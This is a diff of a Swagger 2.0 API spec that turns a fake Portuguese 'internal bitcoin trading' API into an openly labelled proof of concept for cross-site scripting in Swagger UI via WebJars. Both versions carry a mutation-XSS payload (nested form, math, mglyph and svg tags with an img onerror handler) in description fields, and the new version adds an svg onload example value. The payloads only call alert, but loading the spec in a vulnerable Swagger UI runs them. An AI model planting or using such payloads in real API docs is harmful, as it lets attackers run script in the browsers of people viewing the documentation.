@@ -1,64 +1,44 @@
 swagger: '2.0'
 info:
-  title: Comercio de Bitcoins para funcionarios internos
+  title: PoC XSS Swagger WebJars
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('WebJars_Swagger_XSS') src=1>"></form>
-  version: production
-basePath: /JSSResource/
+  version: "1.0"
+basePath: /api/
 produces:
-  - application/xml
   - application/json
 consumes:
-  - application/xml
   - application/json
-security:
-  - basicAuth: []
 paths:
-  /compraBitcoin:
+  /executarXSS:
     post:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - compraBitcoin
-      operationId: findAccounts
-      summary: Compre com um clique
-  '/accounts/groupid/{id}':
-    delete:
+      summary: Testar vulnerabilidade XSS
+      description: |
+        Endpoint vulnerável a XSS via campo JSON ou XML malicioso.
       parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><TESTE><path id="</TESTE><img onerror=alert('WebJars_Swagger_XSS') src=1>"></form>
-
-          format: int64
-          in: path
-          name: id
+        - in: body
+          name: payload
           required: true
-          type: integer
+          schema:
+            type: object
+            properties:
+              input:
+                type: string
+                example: <svg/onload=alert('WebJars_Swagger_XSS')>
       responses:
         '200':
-          description: No response was specified
+          description: Requisição processada
       tags:
-        - compraBitcoin
-      operationId: deleteGroupById
-      summary: Delete seus rastros
+        - XSS
+tags:
+  - name: XSS
+    description: Prova de conceito de execução de XSS no Swagger UI
 definitions:
-  '':
+  XSSPayload:
+    type: object
     properties:
-      id:
-        format: int64
-        type: integer
-      name:
-        type: string
-  Account:
-    properties:
-      id:
-        format: int64
-        type: integer
-      name:
+      input:
         type: string
 securityDefinitions:
   basicAuth:
     type: basic
-tags:
-  - description: Apenas bitcoin e etherium são aceitas
-    name: Venda de Bitcoins 100% Seguro !!!
